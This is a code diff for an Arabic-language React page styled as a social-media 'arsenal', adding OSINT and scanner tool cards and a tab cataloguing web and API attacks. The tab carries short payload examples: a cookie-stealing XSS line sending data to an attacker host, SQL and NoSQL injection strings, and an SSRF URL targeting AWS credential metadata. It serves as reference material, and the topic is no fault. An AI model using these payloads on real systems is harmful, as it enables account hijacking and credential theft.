@@ -22,7 +22,8 @@ const SECTIONS = [
   { id: "credential",  label: "حصاد بيانات الاعتماد", icon: "⊕", color: "#e21227" },
   { id: "bypass",      label: "تقنيات الالتفاف",      icon: "⬢", color: "#10b981" },
   { id: "tools",       label: "الأدوات الداعمة",       icon: "▣", color: "#6366f1" },
-  { id: "siem",        label: "SIEM / SOAR / EDR",   icon: "◈", color: "#f97316" },
+  { id: "webvuln",     label: "ثغرات الويب والـ API", icon: "◆", color: "#f97316" },
+  { id: "siem",        label: "SIEM / SOAR / EDR",   icon: "◈", color: "#f59e0b" },
   { id: "deepfake",    label: "التزييف العميق",        icon: "⬟", color: "#ec4899" },
   { id: "bots",        label: "البوتات والأتمتة",      icon: "⊙", color: "#22d3ee" },
   { id: "defense",     label: "استراتيجيات الحماية",  icon: "◈", color: "#10b981" },
@@ -240,6 +241,20 @@ const OSINT_TOOLS = [
       { name: "Email Addresses", detail: "استخراج عناوين البريد الإلكتروني المدمجة في ملفات المستندات", icon: Mail },
     ],
     versions: ["CLI (Free/OS)", "Docker"],
+  },
+  {
+    id: "osint_framework", name: "OSINT Framework", category: "OSINT Directory & Navigator",
+    color: "#10b981", icon: "◆", threat: "INFO", vendor: "Justin Nordine / osintframework.com",
+    desc: "الدليل الأشمل عالمياً لأدوات OSINT — شجرة تفاعلية تصنّف مئات الأدوات والمصادر حسب نوع المعلومة المطلوبة",
+    capabilities: [
+      { name: "Tree-based Navigation", detail: "تصنيف هرمي: أشخاص → بريد إلكتروني / هاتف / اسم مستخدم / عنوان / صورة — ابحث من حيث تبدأ", icon: GitBranch },
+      { name: "Category Coverage", detail: "20+ فئة: Social Networks, Email, Domain, IP, Geolocation, Images, Video, Bitcoin, Phone, Transportation, Dark Web", icon: Layers },
+      { name: "Tool Links", detail: "كل ورقة في الشجرة = رابط مباشر للأداة أو الخدمة — أكثر من 700 أداة موثقة ومصنفة", icon: Link },
+      { name: "Offline Version", detail: "يمكن تشغيله محلياً — GitHub repo لاستخدامه دون اتصال بالإنترنت", icon: Monitor },
+      { name: "Regular Updates", detail: "مجتمع نشط يضيف أدوات وخدمات جديدة باستمرار", icon: RefreshCw },
+      { name: "Search Function", detail: "بحث فوري في كل الفئات لإيجاد الأداة المناسبة لنوع الهدف", icon: Search },
+    ],
+    versions: ["Web (osintframework.com)", "GitHub (محلي)", "Chrome Extension"],
   },
   {
     id: "foca", name: "FOCA", category: "Metadata & Document Recon",
@@ -660,6 +675,45 @@ const SUPPORT_TOOLS = [
       { name: "LinkedIn Integration", detail: "استخراج أسماء موظفي الشركة من LinkedIn" },
       { name: "Multiple Sources", detail: "+20 مصدر بحث: Google, Bing, Baidu, Yahoo, DNSdumpster" },
       { name: "Export Results", detail: "تصدير XML, JSON مع خيار حفظ تلقائي" },
+    ],
+  },
+  {
+    id: "owasp_zap", name: "OWASP ZAP", category: "Web App Security Scanner",
+    color: "#e21227", icon: Bug, threat: "HIGH", vendor: "OWASP Foundation",
+    desc: "أشهر أداة مفتوحة المصدر لفحص أمن تطبيقات الويب — اكتشاف XSS وSQL Injection وCSRF وآلاف الثغرات الأخرى",
+    features: [
+      { name: "Active Scanning", detail: "مسح نشط يختبر كل نقطة نهاية API وصفحة ويب بأكثر من 100 نوع هجوم تلقائي" },
+      { name: "Passive Scanning", detail: "مراقبة صامتة لحركة الشبكة واكتشاف الثغرات دون إرسال طلبات هجومية" },
+      { name: "Spider / AJAX Spider", detail: "زحف الموقع الكامل واكتشاف كل الصفحات والنقاط النهاية تلقائياً" },
+      { name: "Fuzzer", detail: "اختبار المدخلات بالقوة الغاشمة: SQL, XSS, Buffer Overflow, Command Injection" },
+      { name: "API Import (OpenAPI/SOAP)", detail: "استيراد مواصفات API مباشرة واختبارها بالكامل — REST, GraphQL, SOAP" },
+      { name: "Automation / CI-CD", detail: "تكامل كامل مع Jenkins/GitLab CI — اختبار أمني في كل build" },
+    ],
+  },
+  {
+    id: "nmap", name: "Nmap / Nmap NSE", category: "Network Discovery & Audit",
+    color: "#f59e0b", icon: Radar, threat: "HIGH", vendor: "Gordon Lyon (Fyodor)",
+    desc: "الأداة المرجعية العالمية لاستطلاع الشبكات وفحص المنافذ — مع محرك NSE Scripts لاكتشاف الثغرات",
+    features: [
+      { name: "Port Scanning", detail: "فحص آلاف المنافذ بتقنيات: SYN Stealth, UDP, FIN, XMAS, NULL, ACK — تجنب جدران الحماية" },
+      { name: "OS Detection (-O)", detail: "تحديد نظام التشغيل والإصدار بدقة عالية بناءً على بصمة TCP/IP Stack" },
+      { name: "Service Version (-sV)", detail: "تحديد الخدمة والإصدار الدقيق: Apache 2.4.49, OpenSSH 7.4 — ربط مباشر بـ CVEs" },
+      { name: "NSE Scripts Library", detail: "600+ script: vuln, exploit, brute, auth, discovery, safe — نفّذها مع --script" },
+      { name: "Timing & Evasion (-T / -D)", detail: "إبطاء المسح لتجنب الاكتشاف أو الإسراع — Decoy IPs لإخفاء المصدر الحقيقي" },
+      { name: "Zenmap GUI", detail: "واجهة رسومية تعرض خريطة شبكة بصرية مع تاريخ المسوحات" },
+    ],
+  },
+  {
+    id: "sqlmap", name: "SQLMap", category: "SQL Injection Automation",
+    color: "#8b5cf6", icon: Database, threat: "CRITICAL", vendor: "sqlmap-dev",
+    desc: "أداة Python مفتوحة المصدر تكتشف وتستغل ثغرات SQL Injection بشكل كامل وتلقائي — استخراج كامل قاعدة البيانات",
+    features: [
+      { name: "Auto Detection", detail: "اكتشاف تلقائي لكل أنواع SQL Injection: Boolean, Time-based, Error, Union, Stacked" },
+      { name: "Database Support", detail: "دعم: MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MongoDB, Access, SAP MaxDB, DB2" },
+      { name: "Data Extraction", detail: "استخراج: أسماء قواعد البيانات، الجداول، الأعمدة، كل البيانات — بما فيها الكلمات المشفرة" },
+      { name: "Password Hash Cracking", detail: "كسر تلقائي لتجزئات كلمات المرور: MD5, SHA1, bcrypt — قاموس مدمج" },
+      { name: "File System Access", detail: "قراءة وكتابة الملفات على الخادم — رفع webshell عبر SQL في MSSQL/MySQL" },
+      { name: "OS Command Execution", detail: "تنفيذ أوامر نظام التشغيل عبر ثغرة SQL — Meterpreter shell كامل" },
     ],
   },
 ];
@@ -1878,6 +1932,134 @@ export function SocialMediaArsenalPage({ onClose }: Props) {
           </div>
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
             {SUPPORT_TOOLS.map(t => <SupportToolCard key={t.id} tool={t} />)}
+          </div>
+        </div>
+      );
+      case "webvuln": return (
+        <div className="space-y-4">
+          <div className="text-[10px] font-mono text-gray-500 mb-1">
+            ثغرات الويب والـ API الشائعة في منصات التواصل الاجتماعي — XSS · CSRF · OAuth · API Attacks · SQL Injection · SSRF
+          </div>
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            {[
+              {
+                id: "xss", name: "Cross-Site Scripting (XSS)", color: "#e21227", icon: Code2,
+                type: "CRITICAL", owasp: "A03:2021",
+                desc: "حقن كود JavaScript خبيث في صفحات الويب — يُنفَّذ في متصفح الضحية لسرقة الكوكيز وبيانات الاعتماد",
+                variants: [
+                  { name: "Stored XSS", detail: "حقن دائم في قاعدة البيانات — يُصيب كل زائر للصفحة: Bio، تعليقات، اسم المستخدم", sev: "CRITICAL" },
+                  { name: "Reflected XSS", detail: "عبر معاملات URL — فعّال مع التصيد: facebook.com/search?q=<script>", sev: "HIGH" },
+                  { name: "DOM-based XSS", detail: "في JavaScript العميل فقط — لا يمر بالخادم، يتجاوز WAF الخادم", sev: "HIGH" },
+                  { name: "XSS + Cookie Steal", detail: "document.cookie → fetch('https://attacker/'+btoa(document.cookie))", sev: "CRITICAL" },
+                  { name: "XSS Keylogger", detail: "onkeypress event لالتقاط كل ما يكتبه المستخدم في الصفحة المُصابة", sev: "CRITICAL" },
+                  { name: "BeEF Framework", detail: "Browser Exploitation Framework — التحكم الكامل بمتصفح الضحية عبر XSS hook", sev: "CRITICAL" },
+                ],
+                tools: ["XSStrike", "BeEF", "XSSer", "Dalfox", "OWASP ZAP"],
+              },
+              {
+                id: "csrf", name: "Cross-Site Request Forgery (CSRF)", color: "#a855f7", icon: Share2,
+                type: "HIGH", owasp: "A01:2021",
+                desc: "إجبار المستخدم المُسجَّل على تنفيذ إجراءات غير مقصودة — تغيير البريد، كلمة المرور، إرسال رسائل",
+                variants: [
+                  { name: "Token Bypass — Missing Check", detail: "كثير من التطبيقات تستقبل طلبات بدون CSRF token إذا لم يُرسَل أصلاً", sev: "HIGH" },
+                  { name: "SameSite Cookie Abuse", detail: "استغلال cookies بدون SameSite=Strict — أكثر من 60% من التطبيقات تستخدم Lax", sev: "MEDIUM" },
+                  { name: "JSON CSRF", detail: "API endpoints تستقبل text/plain فتُرسَل عبر HTML form — تتجاوز CORS", sev: "HIGH" },
+                  { name: "Login CSRF", detail: "إجبار الضحية على تسجيل الدخول بحساب المهاجم — اختراق بياناتها", sev: "HIGH" },
+                  { name: "Clickjacking + CSRF", detail: "دمج iframe خفي مع CSRF لإجبار الضحية على النقر دون علمها", sev: "CRITICAL" },
+                  { name: "File Upload CSRF", detail: "رفع ملفات خبيثة بإجراء CSRF على حساب الضحية", sev: "CRITICAL" },
+                ],
+                tools: ["Burp Suite CSRF PoC", "CSRFtester", "XSRFProbe"],
+              },
+              {
+                id: "oauth", name: "OAuth 2.0 / OpenID Attacks", color: "#f97316", icon: Key,
+                type: "CRITICAL", owasp: "A01:2021",
+                desc: "استغلال ثغرات تنفيذ OAuth لاختطاف حسابات — خاصة في تكاملات 'تسجيل الدخول بـ Google/Facebook'",
+                variants: [
+                  { name: "Authorization Code Interception", detail: "اختراق redirect_uri المسموح به واعتراض authorization code — حساب كامل", sev: "CRITICAL" },
+                  { name: "Open Redirect → OAuth Steal", detail: "Open Redirect في الموقع يُعيد توجيه code للمهاجم عبر redirect_uri=open.redirect", sev: "CRITICAL" },
+                  { name: "PKCE Bypass", detail: "ثغرات في تنفيذ PKCE — تسمح باستبدال code_verifier بقيمة متوقعة", sev: "HIGH" },
+                  { name: "State Parameter Abuse", detail: "غياب أو ضعف state parameter — CSRF على تدفق OAuth للتحكم بالحساب", sev: "HIGH" },
+                  { name: "Token Leakage via Referrer", detail: "access_token في URL يتسرب عبر Referrer header للمواقع الخارجية", sev: "MEDIUM" },
+                  { name: "Implicit Flow Redirect", detail: "Implicit Flow المهمل يُرسل token في fragment — قابل للاعتراض بـ iframes", sev: "HIGH" },
+                ],
+                tools: ["Burp Suite OAuth Scanner", "APISEC.ai", "mitmproxy"],
+              },
+              {
+                id: "api_attacks", name: "API Security Attacks", color: "#f59e0b", icon: Server,
+                type: "CRITICAL", owasp: "A04:2023",
+                desc: "هجمات نقاط نهاية REST/GraphQL API — الهدف الأكثر عرضة في منصات التواصل الاجتماعي الحديثة",
+                variants: [
+                  { name: "BOLA / IDOR", detail: "Broken Object Level Auth: تغيير user_id في /api/users/{id}/messages لقراءة رسائل غيرك", sev: "CRITICAL" },
+                  { name: "BFLA", detail: "Broken Function Level Auth: نقاط API للمشرفين بدون فحص صلاحيات — /api/admin/users", sev: "CRITICAL" },
+                  { name: "Mass Assignment", detail: "إرسال حقول إضافية في JSON: {'role':'admin','verified':true} — تُقبَل بدون فلترة", sev: "HIGH" },
+                  { name: "GraphQL Introspection + DOS", detail: "استعلامات GraphQL المتداخلة لاستنزاف الخادم — N+1 queries و Batching Attacks", sev: "HIGH" },
+                  { name: "API Key in Source / Git", detail: "مفاتيح API مُدمجة في كود JavaScript أو مسرّبة في تاريخ Git — أدوات: truffleHog, GitLeaks", sev: "CRITICAL" },
+                  { name: "Rate Limit Bypass", detail: "تجاوز rate limits بـ IP rotation أو header manipulation: X-Forwarded-For, X-Real-IP", sev: "MEDIUM" },
+                ],
+                tools: ["Postman", "Insomnia", "OWASP API Security Top 10", "Burp Suite", "kiterunner"],
+              },
+              {
+                id: "sql_injection", name: "SQL Injection في منصات التواصل", color: "#10b981", icon: Database,
+                type: "CRITICAL", owasp: "A03:2021",
+                desc: "حقن SQL في نقاط الإدخال لاستخراج بيانات المستخدمين وبيانات الاعتماد من قاعدة البيانات",
+                variants: [
+                  { name: "Classic UNION-based", detail: "تحديد عدد الأعمدة ثم استخراج قاعدة البيانات: ' UNION SELECT username,password,3 FROM users--", sev: "CRITICAL" },
+                  { name: "Blind Boolean-based", detail: "استنتاج البيانات حرفاً حرفاً: 1 AND SUBSTRING(password,1,1)='a'", sev: "HIGH" },
+                  { name: "Time-based Blind", detail: "تأكيد الثغرة عبر تأخير الاستجابة: 1; IF(1=1) WAITFOR DELAY '0:0:5'", sev: "HIGH" },
+                  { name: "NoSQL Injection", detail: "MongoDB/CouchDB: {'$where': 'this.password == this.password'} — تجاوز المصادقة", sev: "CRITICAL" },
+                  { name: "Second-Order Injection", detail: "حقن مُخزَّن يُفعَّل لاحقاً عند استخدام البيانات في استعلام آخر", sev: "HIGH" },
+                  { name: "Out-of-Band Exfiltration", detail: "استخراج البيانات عبر DNS/HTTP بدلاً من استجابة HTTP — يتجاوز WAF", sev: "HIGH" },
+                ],
+                tools: ["SQLMap", "Havij", "jSQL Injection", "BBQSQL"],
+              },
+              {
+                id: "ssrf", name: "Server-Side Request Forgery (SSRF)", color: "#22d3ee", icon: Network,
+                type: "CRITICAL", owasp: "A10:2021",
+                desc: "إجبار الخادم على إرسال طلبات HTTP لموارد داخلية — الوصول لـ metadata AWS وخدمات داخلية محمية",
+                variants: [
+                  { name: "Cloud Metadata SSRF", detail: "AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/ — بيانات اعتماد IAM", sev: "CRITICAL" },
+                  { name: "Internal Network Scan", detail: "استخدام الخادم كـ proxy لمسح الشبكة الداخلية: http://192.168.1.1/admin", sev: "HIGH" },
+                  { name: "Blind SSRF", detail: "الخادم يُرسل الطلب لكن لا يُعيد الاستجابة — كشف عبر DNS interactions: Burp Collaborator", sev: "MEDIUM" },
+                  { name: "SSRF → RCE", detail: "SSRF إلى redis://localhost:6379 أو gopher:// — تنفيذ أوامر عبر خدمات داخلية", sev: "CRITICAL" },
+                  { name: "Filter Bypass", detail: "تجاوز فلاتر SSRF: 0x7f000001، 127.0.0.1.nip.io، ➀ (Unicode)، http://[::1]/", sev: "HIGH" },
+                  { name: "PDF/Image SSRF", detail: "توليد PDF/screenshot من URL يحتوي طلب SSRF — شائع في ميزات 'مشاركة المحتوى'", sev: "HIGH" },
+                ],
+                tools: ["Burp Suite", "SSRFmap", "Gopherus", "Interactsh"],
+              },
+            ].map(vuln => (
+              <motion.div key={vuln.id} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
+                className="rounded-2xl border p-4 space-y-3" style={{ borderColor: vuln.color + "30", background: "rgba(0,0,0,0.8)" }}>
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-2">
+                    <div className="w-9 h-9 rounded-xl flex items-center justify-center" style={{ background: vuln.color + "20", border: `1px solid ${vuln.color}35` }}>
+                      <vuln.icon size={15} style={{ color: vuln.color }} />
+                    </div>
+                    <div>
+                      <div className="font-bold text-white text-[11px] font-mono">{vuln.name}</div>
+                      <div className="text-[9px] font-mono" style={{ color: vuln.color }}>{vuln.owasp}</div>
+                    </div>
+                  </div>
+                  <div className="px-2 py-0.5 rounded text-[8px] font-bold font-mono" style={{ background: SEV_COLOR[vuln.type] + "22", color: SEV_COLOR[vuln.type], border: `1px solid ${SEV_COLOR[vuln.type]}40` }}>{vuln.type}</div>
+                </div>
+                <p className="text-[10px] text-gray-400 font-mono leading-relaxed">{vuln.desc}</p>
+                <div className="space-y-1.5">
+                  {vuln.variants.map((v, i) => (
+                    <div key={i} className="rounded-lg px-2.5 py-1.5" style={{ background: vuln.color + "08", border: `1px solid ${vuln.color}20` }}>
+                      <div className="flex items-center justify-between mb-0.5">
+                        <span className="text-[10px] font-bold font-mono text-white">{v.name}</span>
+                        <span className="text-[8px] font-mono font-bold" style={{ color: SEV_COLOR[v.sev] }}>{v.sev}</span>
+                      </div>
+                      <div className="text-[9px] font-mono text-gray-400 leading-relaxed">{v.detail}</div>
+                    </div>
+                  ))}
+                </div>
+                <div className="flex flex-wrap gap-1 pt-1">
+                  {vuln.tools.map((t, i) => (
+                    <span key={i} className="px-1.5 py-0.5 rounded text-[8px] font-mono text-gray-400" style={{ background: vuln.color + "15", border: `1px solid ${vuln.color}25` }}>{t}</span>
+                  ))}
+                </div>
+              </motion.div>
+            ))}
           </div>
         </div>
       );
